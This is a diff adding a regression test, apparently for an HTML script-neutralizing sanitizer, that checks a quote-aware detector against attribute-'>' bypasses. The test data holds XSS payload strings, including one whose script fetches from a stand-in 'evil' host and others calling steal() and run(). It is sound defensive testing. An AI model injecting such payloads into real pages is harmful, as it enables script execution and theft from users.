@@ -54,6 +54,36 @@ for (const tag of scriptTags(neutralized)) {
 // executable <script> the browser would run.
 assert.doesNotMatch(neutralized, /<script>\s*window\.__pwned/, 'no bare executable inline script survives')
 
+// Regression (T14 security sweep): a literal '>' inside a script attribute value
+// must not truncate the match and leave a typeless — executable — inline script.
+// The pre-fix regex matched only `<script a=">`, producing an executable tag
+// whose body `fetch(...)//` ran in the sandbox (confirmed in a real browser).
+// This detector is quote-aware (mirrors HTML tokenization), unlike scriptTags
+// above, so it sees the tag boundary the browser actually sees.
+function executableQuoteAware(html: string): boolean {
+  for (const match of html.matchAll(/<script\b((?:"[^"]*"|'[^']*'|[^>])*)>/gi)) {
+    const attrs = match[1]
+    const typeMatch = attrs.match(/(?:^|\s)type\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/i)
+    const type = (typeMatch ? typeMatch[2] ?? typeMatch[3] ?? typeMatch[4] ?? '' : '').trim().toLowerCase()
+    if (EXECUTABLE_TYPES.has(type)) return true
+  }
+  return false
+}
+for (const bypass of [
+  `<script a=">fetch('//evil')//"></script>`,
+  `<script data-x='a>b'>steal()</script>`,
+  `<script title="close > here" src="x">run()</script>`,
+]) {
+  assert.equal(
+    executableQuoteAware(neutralizeAuthorScripts(bypass)),
+    false,
+    `attr-'>' script must be neutralized: ${bypass}`,
+  )
+}
+// The benign author scripts must still be fully neutralized under the same
+// quote-aware detector (the fix must not regress the ordinary path).
+assert.equal(executableQuoteAware(neutralizeAuthorScripts(authored)), false, 'ordinary author scripts stay inert')
+
 // Full compose: exactly one executable script and it is our picker.
 const composed = composeAnnotateSrcDoc(authored)
 const composedTags = scriptTags(composed)
